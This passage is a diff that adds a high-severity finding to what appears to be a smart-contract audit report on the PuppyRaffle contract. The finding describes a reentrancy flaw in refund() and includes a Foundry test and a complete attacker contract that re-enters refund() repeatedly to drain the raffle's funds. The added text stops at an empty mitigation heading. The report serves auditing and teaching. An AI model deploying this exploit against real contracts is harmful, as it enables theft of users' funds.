@@ -95,3 +95,104 @@ enter the raffle with multiple addresses to bypass the "duplicate check." So, wh
 ```
 3. Lastly, you can implement [Openzepplin Enumerable library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet)
 
+
+### [High-#] RE-ENTRANCY ATTACK: Making external call before state change which would drain the contract balance
+
+**Description:** 
+`PuppyRaffle::refund` can be called repeatedly by another contract before its first invocation finishes due to it making 
+external call before updating the state variable
+
+```javascript
+
+    @External call>    payable(msg.sender).sendValue(entranceFee);
+
+    @State change>   players[playerIndex] = address(0);
+```
+
+**Impact:** 
+
+An attacker can readily enter as a legitimate participant of the raffle and repeatedly exploit the `PuppyRaffle::refund` 
+to drain the `PuppyRaffle` contract balance.
+
+**Proof of Concept:**
+
+Paste this test suite in the `PuppyRaffleTest.t.sol` 
+<details>
+<summary> Proof of Code </summary>
+
+```javascript
+   
+    function testCanEnterRaffleReentrancy() public {
+        //legitimate participants of the PuppyRaffle
+        address[] memory players = new address[](4);
+
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        uint raffleBalance_beforeAttack = address(puppyRaffle).balance;
+
+        //An attacker enters the raffle with the intention of stealing all funds
+        //in the puppyRaffle contract
+
+        REENTRANCY_ATTACK AttackContract = new REENTRANCY_ATTACK(puppyRaffle);
+        // address prankin = address(Attack);
+        address attacker = makeAddr("Attacker");
+
+        vm.deal(attacker, 2 ether);
+
+        vm.prank(attacker);
+        AttackContract.lets_play{value: entranceFee}();
+
+        //Sending payload-
+        AttackContract.attack();
+
+        //Raffle balance after successful attack
+        uint raffleBalance_afterAttack = address(puppyRaffle).balance;
+
+        //attack contract balance after attack
+        uint attackBalance = address(AttackContract).balance;
+
+        //PROOF
+        console.log("raffle balance before attack", raffleBalance_beforeAttack);
+        console.log("raffle balance after attack", raffleBalance_afterAttack);
+
+        console.log("AttackContract balance after attack", attackBalance);
+    }
+
+
+contract REENTRANCY_ATTACK {
+    PuppyRaffle puppyRaffle;
+    uint public playerIndex;
+    uint public entranceFee;
+
+    constructor(PuppyRaffle raffle) {
+        puppyRaffle = raffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function lets_play() public payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+    }
+
+    function attack() public {
+        puppyRaffle.refund(playerIndex);
+    }
+
+    receive() external payable {
+        if (address(puppyRaffle).balance >= 1 ether) {
+            puppyRaffle.refund(playerIndex);
+        }
+    }
+
+    fallback() external payable {}
+}
+
+```
+</details>
+
+**Recommended Mitigation:** 
